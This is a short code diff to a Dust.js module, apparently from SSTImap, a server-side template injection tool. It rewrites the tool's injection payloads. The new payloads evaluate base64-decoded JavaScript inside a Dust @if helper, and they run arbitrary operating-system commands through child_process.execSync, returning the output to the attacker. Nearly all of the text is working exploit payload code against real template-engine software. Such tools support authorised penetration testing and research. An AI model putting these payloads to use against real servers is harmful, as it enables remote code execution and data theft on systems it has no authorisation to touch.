@@ -41,8 +41,7 @@ class Dust(javascript.Javascript):
             },
             'evaluate': {
                 'call': 'render',
-                # Prototype pollution causes problems with Dustjs, but JSON-like quotes save the day
-                'evaluate': """{{@if cond="eval('this.__proto__.sstimap=\\'\\\\\\"\\'+'+Buffer('{code_b64p}', 'base64').toString()+'+\\'\\\\\\"\\'')"}}{{/if}}{{sstimap|jp}}"""
+                'evaluate': """{{@if cond="context.global.sstimap=eval(Buffer('{code_b64p}', 'base64').toString())"}}{{/if}}{{sstimap}}"""
             },
             'evaluate_error': {
                 'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
@@ -54,7 +53,7 @@ class Dust(javascript.Javascript):
             'execute': {
                 'call': 'evaluate',
                 'exfiltrate': 'base64',
-                'execute': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString()).toString('base64')""",
+                'execute': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())""",
             },
             'write': {
                 'call': 'evaluate',
